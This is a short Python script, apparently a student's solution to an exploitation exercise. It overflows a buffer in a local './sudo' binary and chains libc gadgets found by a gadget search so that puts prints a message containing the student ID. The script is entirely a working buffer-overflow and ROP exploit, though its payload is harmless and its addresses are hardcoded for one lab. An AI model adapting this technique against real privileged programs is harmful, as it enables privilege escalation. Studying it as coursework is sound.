import os
import sys
import struct

import assemble
from search import GadgetSearch

PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
DUMP_START_ADDR = 0xb7c39750
FINAL_RET_ADDR = 0x080488c6
MY_ID = 203954276
PUTS_ADDR = 0xb7c81ca0


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():
    s = GadgetSearch(LIBC_DUMP_PATH, DUMP_START_ADDR)
    buf_end_addr = 0xbfffe12c
    my_str = get_string(MY_ID)
    offset = 66
    buf = 'a' * offset
    pop_ebp = s.find('pop ebp')
    add_esp_4 = s.find('add esp, 4')
    pop_esp = s.find('pop esp')

    string_addr = buf_end_addr + 20
    loop_addr = buf_end_addr
    shellcode = buf + struct.pack('<IIIII', pop_ebp, PUTS_ADDR, PUTS_ADDR, add_esp_4, string_addr) + my_str
    return shellcode


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
